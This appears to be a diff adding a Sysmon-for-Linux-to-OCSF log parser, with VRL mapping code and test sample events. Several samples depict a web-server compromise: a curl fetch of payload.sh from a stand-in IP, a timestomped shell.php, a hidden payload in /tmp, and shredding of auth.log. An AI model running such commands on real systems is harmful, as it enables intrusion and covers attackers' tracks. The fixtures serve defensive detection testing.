@@ -1,0 +1,420 @@
+name: sysmon_linux_xml_ocsf
+display_name: Microsoft Sysmon for Linux (XML, OCSF)
+version: "1.0.0"
+description: >
+  Parses raw Sysmon for Linux **XML** records into complete OCSF 1.9.0 events.
+  Linux Sysmon emits a subset of the Windows EventIDs:
+    1  Process Create      -> Process Activity 1007 (Launch)
+    2  File Creation Time  -> File System Activity 1001 (Set Attributes)
+    3  Network Connect     -> Network Activity 4001 (Open)
+    4  Sysmon State Change -> Application Lifecycle 6002 (Start/Stop)
+    5  Process Terminate   -> Process Activity 1007 (Terminate)
+    11 File Create         -> File System Activity 1001 (Create)
+    16 Config Change       -> Application Lifecycle 6002 (Update)
+    23/26 File Delete      -> File System Activity 1001 (Delete)
+  Anything else falls through to Process Activity 1007 (Other). Linux Sysmon
+  writes "-" for values it could not determine (unbacked parents, absent hashes,
+  "no level" integrity); those are normalised away rather than stored literally.
+  Emits the whole OCSF object on the root so it lands in ocsf_logs.event and the
+  promoted columns materialize. Carries metadata.profiles ["host"]. The OCSF
+  counterpart of parsers/sysmon_linux_xml - deploy one or the other, never both.
+ocsf_version: "1.9.0"
+match_values:
+  - linux_sysmon
+category: endpoint
+vendor: "Microsoft"
+product: "Sysmon for Linux"
+parser_vrl: |
+  # Sysmon for Linux **XML** -> OCSF 1.9.0. Emits the COMPLETE record on root.
+  # Linux Sysmon renders the same <Event><System>/<EventData> shape as Windows but
+  # emits only a subset of EventIDs (1,2,3,4,5,11,16,23,26) and writes "-" for
+  # every value it could not determine.
+  raw_log = string!(.message)
+  parsed, err = parse_xml(raw_log)
+
+  if err != null || !is_object(parsed) {
+      . = {
+          "class_uid": 1007,
+          "class_name": "Process Activity",
+          "category_uid": 1,
+          "category_name": "System Activity",
+          "activity_id": 99,
+          "activity_name": "Other",
+          "type_uid": 100799,
+          "severity_id": 1,
+          "severity": "Informational",
+          "time": 0,
+          "message": raw_log,
+          "raw_data": raw_log,
+          # 1007 requires actor/device/process even on the unparseable path.
+          "process": { "pid": 0 },
+          "actor": { "process": { "pid": 0 } },
+          "device": { "hostname": "", "type_id": 0 },
+          "metadata": {
+              "version": "1.9.0",
+              "profiles": ["host"],
+              "uid": uuid_v4(),
+              "log_level": "error",
+              "log_source": "linux_sysmon",
+              "product": { "name": "Sysmon for Linux", "vendor_name": "Microsoft" }
+          }
+      }
+  } else {
+      ev = object(parsed.Event) ?? {}
+      system = object(ev.System) ?? {}
+
+      eid = to_int(system.EventID) ?? 0
+      if eid == 0 { eid = to_int(system.EventID.text) ?? 0 }
+
+      computer = downcase(to_string(system.Computer) ?? "")
+      channel = to_string(system.Channel) ?? ""
+      if channel == "" { channel = "Linux-Sysmon/Operational" }
+      log_provider = to_string(system.Provider."@Name") ?? ""
+      if log_provider == "" { log_provider = "Linux-Sysmon" }
+      record_id = to_string(system.EventRecordID) ?? ""
+
+      # ---- event time: System/TimeCreated/@SystemTime -> epoch ms -------
+      time_ms = 0
+      ts_str = to_string(system.TimeCreated."@SystemTime") ?? ""
+      if ts_str != "" {
+          t, terr = parse_timestamp(ts_str, "%+")
+          if terr == null { time_ms = to_unix_timestamp(t, unit: "milliseconds") }
+      }
+
+      # ---- Level -> OCSF severity --------------------------------------
+      level_int = to_int(system.Level) ?? 4
+      severity_id = 1
+      severity = "Informational"
+      if level_int == 1 {
+          severity_id = 5; severity = "Critical"
+      } else if level_int == 2 {
+          severity_id = 4; severity = "High"
+      } else if level_int == 3 {
+          severity_id = 3; severity = "Medium"
+      }
+
+      # ---- EventData/Data[@Name] -> flat key/value map ------------------
+      data_items = ev.EventData.Data
+      items = []
+      if is_array(data_items) {
+          items = array(data_items) ?? []
+      } else if is_object(data_items) {
+          items = [data_items]
+      }
+      kv = {}
+      for_each(items) -> |_i, item| {
+          iname = to_string(item."@Name") ?? ""
+          ivalue = to_string(item.text) ?? ""
+          if iname != "" { kv = set!(kv, [iname], ivalue) }
+      }
+
+      # NOTE on get(): the compiler statically types `kv` as the empty object
+      # literal, so `kv.X` would be `null` and every to_int on it would look
+      # infallible — stripping the runtime guard and letting a bad ProcessId
+      # ABORT the program. get() returns `any`, so the coalescing stays real.
+
+      # ---- shared extraction. Linux Sysmon writes "-" for "unknown". ----
+      actor_user = downcase(to_string(get(kv, ["User"]) ?? null) ?? "")
+      if actor_user == "-" { actor_user = "" }
+
+      img = to_string(get(kv, ["Image"]) ?? null) ?? ""
+      if img == "-" { img = "" }
+      proc_name = ""
+      anm, anmerr = parse_regex(img, r'(?P<b>[^\\/]+)$')
+      if anmerr == null { proc_name = string(anm.b) ?? "" }
+
+      pimg = to_string(get(kv, ["ParentImage"]) ?? null) ?? ""
+      if pimg == "-" { pimg = "" }
+      parent_name = ""
+      pnm, pnmerr = parse_regex(pimg, r'(?P<b>[^\\/]+)$')
+      if pnmerr == null { parent_name = string(pnm.b) ?? "" }
+
+      parent_cmd = to_string(get(kv, ["ParentCommandLine"]) ?? null) ?? ""
+      if parent_cmd == "-" { parent_cmd = "" }
+      parent_guid = to_string(get(kv, ["ParentProcessGuid"]) ?? null) ?? ""
+      if parent_guid == "{00000000-0000-0000-0000-000000000000}" { parent_guid = "" }
+
+      # SHA-256 out of the "SHA256=..,MD5=.." Hashes string
+      sha = ""
+      hs = to_string(get(kv, ["Hashes"]) ?? null) ?? ""
+      if hs != "-" && hs != "" {
+          hm, hmerr = parse_regex(hs, r'SHA256=(?P<h>[0-9A-Fa-f]+)')
+          if hmerr == null { sha = downcase(string(hm.h) ?? "") }
+      }
+
+      subject_file = { "name": proc_name, "path": img, "type_id": 1 }
+      if sha != "" { subject_file.hashes = [{ "algorithm_id": 3, "value": sha }] }
+      subject_process = {
+          "name": proc_name,
+          "cmd_line": to_string(get(kv, ["CommandLine"]) ?? null) ?? "",
+          "pid": to_int(get(kv, ["ProcessId"]) ?? null) ?? 0,
+          "uid": to_string(get(kv, ["ProcessGuid"]) ?? null) ?? "",
+          "file": subject_file
+      }
+
+      parent_process = {
+          "name": parent_name,
+          "cmd_line": parent_cmd,
+          "pid": to_int(get(kv, ["ParentProcessId"]) ?? null) ?? 0,
+          "uid": parent_guid,
+          "file": { "name": parent_name, "path": pimg, "type_id": 1 }
+      }
+      # A process that predates the sensor has no tracked parent at all.
+      has_parent = pimg != "" || parent_cmd != ""
+
+      actor_process = subject_process
+      if has_parent { actor_process.parent_process = parent_process }
+
+      device = { "hostname": computer, "type_id": 0 }
+
+      tf = to_string(get(kv, ["TargetFilename"]) ?? null) ?? ""
+      if tf == "-" { tf = "" }
+      file_name = ""
+      fnm, fnmerr = parse_regex(tf, r'(?P<b>[^\\/]+)$')
+      if fnmerr == null { file_name = string(fnm.b) ?? "" }
+      target_file = { "name": file_name, "path": tf, "type_id": 1 }
+      if sha != "" { target_file.hashes = [{ "algorithm_id": 3, "value": sha }] }
+
+      # RuleName carries the config's MITRE annotation. Linux Sysmon emits the
+      # PascalCase TechniqueID= form, Windows the snake_case technique_id=.
+      rule_name = to_string(get(kv, ["RuleName"]) ?? null) ?? ""
+      if rule_name == "-" { rule_name = "" }
+      technique_id = ""
+      if rule_name != "" {
+          tm, tmerr = parse_regex(rule_name, r'(?i)technique[_]?id=(?P<tid>[^,\s]+)')
+          if tmerr == null { technique_id = upcase(string(tm.tid) ?? "") }
+      }
+
+      # ---- defaults; overridden per branch below ------------------------
+      class_uid = 1007
+      class_name = "Process Activity"
+      category_uid = 1
+      category_name = "System Activity"
+      activity_id = 99
+      activity_name = "Other"
+      profiles = ["host"]
+
+      ocsf = {}
+
+      if eid == 1 || eid == 5 {
+          # Process Create / Terminate -> Process Activity 1007
+          if eid == 1 {
+              activity_id = 1; activity_name = "Launch"
+          } else {
+              activity_id = 2; activity_name = "Terminate"
+          }
+          # The NEW process is `process`; its launcher is `actor.process`.
+          ocsf.process = subject_process
+          if eid == 1 && has_parent {
+              ocsf.actor = { "process": parent_process, "user": { "name": actor_user } }
+          } else {
+              ocsf.actor = { "process": subject_process, "user": { "name": actor_user } }
+          }
+          ocsf.device = device
+          integrity = to_string(get(kv, ["IntegrityLevel"]) ?? null) ?? ""
+          if integrity == "no level" { integrity = "" }
+          ocsf.unmapped = {
+              "current_directory": to_string(get(kv, ["CurrentDirectory"]) ?? null) ?? "",
+              "integrity_level": integrity,
+              "logon_id": to_string(get(kv, ["LogonId"]) ?? null) ?? "",
+              "terminal_session_id": to_string(get(kv, ["TerminalSessionId"]) ?? null) ?? "",
+              "parent_user": to_string(get(kv, ["ParentUser"]) ?? null) ?? "",
+              "hashes_raw": hs
+          }
+      } else if eid == 3 {
+          # Network Connection -> Network Activity 4001 (Open)
+          class_uid = 4001; class_name = "Network Activity"
+          category_uid = 4; category_name = "Network Activity"
+          activity_id = 1; activity_name = "Open"
+          src_host = downcase(to_string(get(kv, ["SourceHostname"]) ?? null) ?? "")
+          if src_host == "-" { src_host = "" }
+          dst_host = downcase(to_string(get(kv, ["DestinationHostname"]) ?? null) ?? "")
+          if dst_host == "-" { dst_host = "" }
+          ocsf.src_endpoint = {
+              "ip": downcase(to_string(get(kv, ["SourceIp"]) ?? null) ?? ""),
+              "port": to_int(get(kv, ["SourcePort"]) ?? null) ?? 0,
+              "hostname": src_host
+          }
+          ocsf.dst_endpoint = {
+              "ip": downcase(to_string(get(kv, ["DestinationIp"]) ?? null) ?? ""),
+              "port": to_int(get(kv, ["DestinationPort"]) ?? null) ?? 0,
+              "hostname": dst_host
+          }
+          # Initiated=true means this host opened the connection -> Outbound.
+          initiated = downcase(to_string(get(kv, ["Initiated"]) ?? null) ?? "")
+          direction_id = 0
+          if initiated == "true" { direction_id = 2 }
+          if initiated == "false" { direction_id = 1 }
+          conn = { "direction_id": direction_id }
+          proto = downcase(to_string(get(kv, ["Protocol"]) ?? null) ?? "")
+          # protocol_num is an IANA number; only emit it when known.
+          if proto == "tcp" { conn.protocol_num = 6 }
+          if proto == "udp" { conn.protocol_num = 17 }
+          ocsf.connection_info = conn
+          ocsf.actor = { "process": actor_process, "user": { "name": actor_user } }
+          ocsf.device = device
+          ocsf.unmapped = {
+              "source_is_ipv6": to_string(get(kv, ["SourceIsIpv6"]) ?? null) ?? "",
+              "destination_is_ipv6": to_string(get(kv, ["DestinationIsIpv6"]) ?? null) ?? "",
+              "source_port_name": to_string(get(kv, ["SourcePortName"]) ?? null) ?? "",
+              "destination_port_name": to_string(get(kv, ["DestinationPortName"]) ?? null) ?? ""
+          }
+      } else if eid == 4 || eid == 16 {
+          # Sysmon service state / config change -> Application Lifecycle 6002.
+          # This is the sensor itself starting, stopping or reconfiguring.
+          class_uid = 6002; class_name = "Application Lifecycle"
+          category_uid = 6; category_name = "Application Activity"
+          state = downcase(to_string(get(kv, ["State"]) ?? null) ?? "")
+          if eid == 16 {
+              activity_id = 8; activity_name = "Update"
+          } else if state == "started" {
+              activity_id = 3; activity_name = "Start"
+          } else if state == "stopped" {
+              activity_id = 4; activity_name = "Stop"
+          } else {
+              activity_id = 99; activity_name = "Other"
+          }
+          # 6002 constrains on one of [app, application]; the application whose
+          # lifecycle this is, is the Sysmon sensor itself.
+          app = { "name": "Sysmon for Linux", "vendor_name": "Microsoft" }
+          app_version = to_string(get(kv, ["Version"]) ?? null) ?? ""
+          if app_version != "" { app.version = app_version }
+          ocsf.app = app
+          ocsf.device = device
+          ocsf.unmapped = {
+              "sysmon_state": to_string(get(kv, ["State"]) ?? null) ?? "",
+              "sysmon_schema_version": to_string(get(kv, ["SchemaVersion"]) ?? null) ?? "",
+              "configuration": to_string(get(kv, ["Configuration"]) ?? null) ?? "",
+              "configuration_file_hash": to_string(get(kv, ["ConfigurationFileHash"]) ?? null) ?? ""
+          }
+      } else if eid == 2 || eid == 11 || eid == 23 || eid == 26 {
+          # File System Activity 1001 family.
+          class_uid = 1001; class_name = "File System Activity"
+          if eid == 11 {
+              activity_id = 1; activity_name = "Create"
+          } else if eid == 2 {
+              activity_id = 6; activity_name = "Set Attributes"
+          } else {
+              activity_id = 4; activity_name = "Delete"
+          }
+          ocsf.file = target_file
+          ocsf.actor = { "process": actor_process, "user": { "name": actor_user } }
+          ocsf.device = device
+          ocsf.unmapped = {
+              "creation_utc_time": to_string(get(kv, ["CreationUtcTime"]) ?? null) ?? "",
+              "previous_creation_utc_time": to_string(get(kv, ["PreviousCreationUtcTime"]) ?? null) ?? "",
+              "hashes_raw": hs,
+              "is_executable": to_string(get(kv, ["IsExecutable"]) ?? null) ?? ""
+          }
+      } else {
+          # EventID Linux Sysmon does not (yet) emit -> Process Activity / Other.
+          ocsf.process = subject_process
+          ocsf.actor = { "process": actor_process, "user": { "name": actor_user } }
+          ocsf.device = device
+      }
+
+      # ---- common envelope ----------------------------------------------
+      ocsf.class_uid = class_uid
+      ocsf.class_name = class_name
+      ocsf.category_uid = category_uid
+      ocsf.category_name = category_name
+      ocsf.activity_id = activity_id
+      ocsf.activity_name = activity_name
+      ocsf.type_uid = class_uid * 100 + activity_id
+      ocsf.severity_id = severity_id
+      ocsf.severity = severity
+      ocsf.time = time_ms
+      ocsf.message = raw_log
+      ocsf.raw_data = raw_log
+      # `attacks` is bound to the security_control profile in Nano's embedded
+      # 1.9.0 contract (the public schema.ocsf.io lists it as unprofiled), so the
+      # profile has to be declared alongside it or the event is rejected.
+      if technique_id != "" {
+          ocsf.attacks = [{ "technique": { "uid": technique_id } }]
+          if !includes(profiles, "security_control") { profiles = push(profiles, "security_control") }
+      }
+
+      # EventRecordID is only unique within a host stream and can be reused after
+      # a log reset; fold in host + event time so a replay stays idempotent while
+      # a later reused RecordID cannot collide.
+      record_uid = ""
+      if record_id != "" && computer != "" && ts_str != "" {
+          record_uid = join!(["sysmon_linux_xml", computer, downcase(channel), downcase(log_provider), record_id, ts_str], "|")
+      }
+      if record_uid == "" { record_uid = uuid_v4() }
+
+      ocsf.metadata = {
+          "version": "1.9.0",
+          "profiles": profiles,
+          "uid": record_uid,
+          "original_event_uid": record_uid,
+          "event_code": to_string(eid),
+          "log_name": channel,
+          "log_provider": log_provider,
+          "log_source": "linux_sysmon",
+          "product": { "name": "Sysmon for Linux", "vendor_name": "Microsoft" }
+      }
+
+      . = ocsf
+  }
+samples:
+  - raw: "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-08-18T13:01:00.123456789Z\"/><EventRecordID>2001</EventRecordID><Correlation/><Execution ProcessID=\"1284\" ThreadID=\"1284\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>web-prod-03</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">TechniqueID=T1059.004,TechniqueName=Unix Shell</Data><Data Name=\"UtcTime\">2026-08-18 13:01:00.123</Data><Data Name=\"ProcessGuid\">{d9e4a0c1-0001-0000-0000-000000000001}</Data><Data Name=\"ProcessId\">20481</Data><Data Name=\"Image\">/usr/bin/curl</Data><Data Name=\"FileVersion\">-</Data><Data Name=\"Description\">-</Data><Data Name=\"Product\">-</Data><Data Name=\"Company\">-</Data><Data Name=\"OriginalFileName\">-</Data><Data Name=\"CommandLine\">curl -s http://198.51.100.9/payload.sh</Data><Data Name=\"CurrentDirectory\">/tmp</Data><Data Name=\"User\">www-data</Data><Data Name=\"LogonGuid\">{00000000-0000-0000-0000-000000000000}</Data><Data Name=\"LogonId\">0</Data><Data Name=\"TerminalSessionId\">0</Data><Data Name=\"IntegrityLevel\">no level</Data><Data Name=\"Hashes\">SHA256=3F786850E387550FDAB836ED7E6DC881DE23001B2E1B8C7C1BFA2D2A0C1FDD34</Data><Data Name=\"ParentProcessGuid\">{d9e4a0c1-0002-0000-0000-000000000002}</Data><Data Name=\"ParentProcessId\">1533</Data><Data Name=\"ParentImage\">/usr/sbin/nginx</Data><Data Name=\"ParentCommandLine\">nginx: worker process</Data><Data Name=\"ParentUser\">www-data</Data></EventData></Event>"
+    expect:
+      "class_uid": 1007
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>2</EventID><Version>5</Version><Level>4</Level><Task>2</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-08-18T13:02:00.123456789Z\"/><EventRecordID>2002</EventRecordID><Correlation/><Execution ProcessID=\"1284\" ThreadID=\"1284\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>web-prod-03</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-08-18 13:02:00.1</Data><Data Name=\"ProcessGuid\">{d9e4a0c1-0003-0000-0000-000000000003}</Data><Data Name=\"ProcessId\">20500</Data><Data Name=\"Image\">/usr/bin/touch</Data><Data Name=\"TargetFilename\">/var/www/html/shell.php</Data><Data Name=\"CreationUtcTime\">2020-01-01 00:00:00.000</Data><Data Name=\"PreviousCreationUtcTime\">2026-08-18 13:01:30.000</Data><Data Name=\"User\">www-data</Data></EventData></Event>"
+    expect:
+      "class_uid": 1001
+      "activity_id": 6
+      "metadata.version": "1.9.0"
+  - raw: "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-08-18T13:03:00.123456789Z\"/><EventRecordID>2003</EventRecordID><Correlation/><Execution ProcessID=\"1284\" ThreadID=\"1284\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>web-prod-03</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-08-18 13:03:00.1</Data><Data Name=\"ProcessGuid\">{d9e4a0c1-0001-0000-0000-000000000001}</Data><Data Name=\"ProcessId\">20481</Data><Data Name=\"Image\">/usr/bin/curl</Data><Data Name=\"User\">www-data</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIsIpv6\">false</Data><Data Name=\"SourceIp\">10.20.30.40</Data><Data Name=\"SourceHostname\">-</Data><Data Name=\"SourcePort\">44312</Data><Data Name=\"SourcePortName\">-</Data><Data Name=\"DestinationIsIpv6\">false</Data><Data Name=\"DestinationIp\">198.51.100.9</Data><Data Name=\"DestinationHostname\">-</Data><Data Name=\"DestinationPort\">80</Data><Data Name=\"DestinationPortName\">http</Data></EventData></Event>"
+    expect:
+      "class_uid": 4001
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>4</EventID><Version>5</Version><Level>4</Level><Task>4</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-08-18T13:04:00.123456789Z\"/><EventRecordID>2004</EventRecordID><Correlation/><Execution ProcessID=\"1284\" ThreadID=\"1284\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>web-prod-03</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"UtcTime\">2026-08-18 13:04:00.1</Data><Data Name=\"State\">Started</Data><Data Name=\"Version\">1.0.0</Data><Data Name=\"SchemaVersion\">4.81</Data></EventData></Event>"
+    expect:
+      "class_uid": 6002
+      "activity_id": 3
+      "metadata.version": "1.9.0"
+  - raw: "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>5</EventID><Version>5</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-08-18T13:05:00.123456789Z\"/><EventRecordID>2005</EventRecordID><Correlation/><Execution ProcessID=\"1284\" ThreadID=\"1284\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>web-prod-03</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-08-18 13:05:00.1</Data><Data Name=\"ProcessGuid\">{d9e4a0c1-0001-0000-0000-000000000001}</Data><Data Name=\"ProcessId\">20481</Data><Data Name=\"Image\">/usr/bin/curl</Data><Data Name=\"User\">www-data</Data></EventData></Event>"
+    expect:
+      "class_uid": 1007
+      "activity_id": 2
+      "metadata.version": "1.9.0"
+  - raw: "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>11</EventID><Version>5</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-08-18T13:11:00.123456789Z\"/><EventRecordID>2011</EventRecordID><Correlation/><Execution ProcessID=\"1284\" ThreadID=\"1284\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>web-prod-03</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-08-18 13:11:00.1</Data><Data Name=\"ProcessGuid\">{d9e4a0c1-0004-0000-0000-000000000004}</Data><Data Name=\"ProcessId\">20510</Data><Data Name=\"Image\">/usr/bin/wget</Data><Data Name=\"TargetFilename\">/tmp/.hidden/payload.sh</Data><Data Name=\"CreationUtcTime\">2026-08-18 13:11:00.000</Data><Data Name=\"User\">www-data</Data></EventData></Event>"
+    expect:
+      "class_uid": 1001
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>16</EventID><Version>5</Version><Level>4</Level><Task>16</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-08-18T13:16:00.123456789Z\"/><EventRecordID>2016</EventRecordID><Correlation/><Execution ProcessID=\"1284\" ThreadID=\"1284\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>web-prod-03</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"UtcTime\">2026-08-18 13:16:00.1</Data><Data Name=\"Configuration\">/etc/sysmon/config.xml</Data><Data Name=\"ConfigurationFileHash\">SHA256=AB12CD34</Data></EventData></Event>"
+    expect:
+      "class_uid": 6002
+      "activity_id": 8
+      "metadata.version": "1.9.0"
+  - raw: "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>23</EventID><Version>5</Version><Level>4</Level><Task>23</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-08-18T13:23:00.123456789Z\"/><EventRecordID>2023</EventRecordID><Correlation/><Execution ProcessID=\"1284\" ThreadID=\"1284\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>web-prod-03</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-08-18 13:23:00.1</Data><Data Name=\"ProcessGuid\">{d9e4a0c1-0005-0000-0000-000000000005}</Data><Data Name=\"ProcessId\">20520</Data><Data Name=\"User\">root</Data><Data Name=\"Image\">/usr/bin/shred</Data><Data Name=\"TargetFilename\">/var/log/auth.log</Data><Data Name=\"Hashes\">SHA256=CD9178C6B3B4C0A9BFB33C7B8FA1BA1E3A0E1E2B3C4D5E6F708192A3B4C5D6E7</Data><Data Name=\"IsExecutable\">false</Data><Data Name=\"Archived\">true</Data></EventData></Event>"
+    expect:
+      "class_uid": 1001
+      "activity_id": 4
+      "metadata.version": "1.9.0"
+  - raw: "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>26</EventID><Version>5</Version><Level>4</Level><Task>26</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-08-18T13:26:00.123456789Z\"/><EventRecordID>2026</EventRecordID><Correlation/><Execution ProcessID=\"1284\" ThreadID=\"1284\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>web-prod-03</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-08-18 13:26:00.1</Data><Data Name=\"ProcessGuid\">{d9e4a0c1-0006-0000-0000-000000000006}</Data><Data Name=\"ProcessId\">20530</Data><Data Name=\"User\">root</Data><Data Name=\"Image\">/usr/bin/rm</Data><Data Name=\"TargetFilename\">/tmp/.hidden/payload.sh</Data><Data Name=\"Hashes\">-</Data><Data Name=\"IsExecutable\">true</Data></EventData></Event>"
+    expect:
+      "class_uid": 1001
+      "activity_id": 4
+      "metadata.version": "1.9.0"
+  - raw: "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-08-18T13:33:00.123456789Z\"/><EventRecordID>2033</EventRecordID><Correlation/><Execution ProcessID=\"1284\" ThreadID=\"1284\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>web-prod-03</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-08-18 13:33:00.1</Data><Data Name=\"ProcessGuid\">{d9e4a0c1-0007-0000-0000-000000000007}</Data><Data Name=\"ProcessId\">900</Data><Data Name=\"Image\">/usr/lib/systemd/systemd-journald</Data><Data Name=\"CommandLine\">/lib/systemd/systemd-journald</Data><Data Name=\"CurrentDirectory\">/</Data><Data Name=\"User\">root</Data><Data Name=\"IntegrityLevel\">no level</Data><Data Name=\"Hashes\">-</Data><Data Name=\"ParentProcessGuid\">{00000000-0000-0000-0000-000000000000}</Data><Data Name=\"ParentProcessId\">1</Data><Data Name=\"ParentImage\">-</Data><Data Name=\"ParentCommandLine\">-</Data><Data Name=\"ParentUser\">-</Data></EventData></Event>"
+    expect:
+      "class_uid": 1007
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>12</EventID><Version>5</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-08-18T13:44:00.123456789Z\"/><EventRecordID>2044</EventRecordID><Correlation/><Execution ProcessID=\"1284\" ThreadID=\"1284\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>web-prod-03</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-08-18 13:44:00.1</Data><Data Name=\"ProcessId\">20540</Data><Data Name=\"Image\">/usr/bin/env</Data></EventData></Event>"
+    expect:
+      "class_uid": 1007
+      "activity_id": 99
+      "metadata.version": "1.9.0"
+  - raw: "2026-08-18T13:00:00Z web-prod-03 sysmon: plain syslog line, not xml"
+    expect:
+      "class_uid": 1007
+      "activity_id": 99
+      "metadata.version": "1.9.0"
